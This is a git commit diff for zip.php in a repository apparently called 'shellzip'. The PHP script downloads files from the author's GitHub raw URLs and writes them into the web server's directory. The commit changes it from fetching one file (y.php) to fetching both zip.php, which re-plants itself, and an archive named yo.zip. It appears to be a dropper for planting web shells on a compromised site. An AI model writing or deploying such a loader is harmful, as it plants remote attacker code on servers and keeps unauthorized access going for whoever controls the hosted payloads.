6fcf751c48a6845571e483566988f273b082b455
ZeddGans <115491780+Zeddgansz@users.noreply.github.com>
2024-10-08 01:44:49 -0500

    Update zip.php

--- zip.php
+++ zip.php
@@ -1,15 +1,17 @@
 <?php
-$file_url = 'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/y.php';
+$files_to_download = [
+    'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/zip.php' => __DIR__ . '/zip.php',
+    'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/yo.zip' => __DIR__ . '/yo.zip',
+];
 
-$save_to = __DIR__ . '/y.php'; // 
+foreach ($files_to_download as $file_url => $save_to) {
+    $file_content = file_get_contents($file_url);
 
-
-$file_content = file_get_contents($file_url);
-
-if ($file_content !== false) {
-    file_put_contents($save_to, $file_content);
-    echo "File has been downloaded and saved as $save_to";
-} else {
-    echo "Failed to download file.";
+    if ($file_content !== false) {
+        file_put_contents($save_to, $file_content);
+        echo "File has been downloaded and saved as $save_to\n";
+    } else {
+        echo "Failed to download file from $file_url\n";
+    }
 }
 ?>
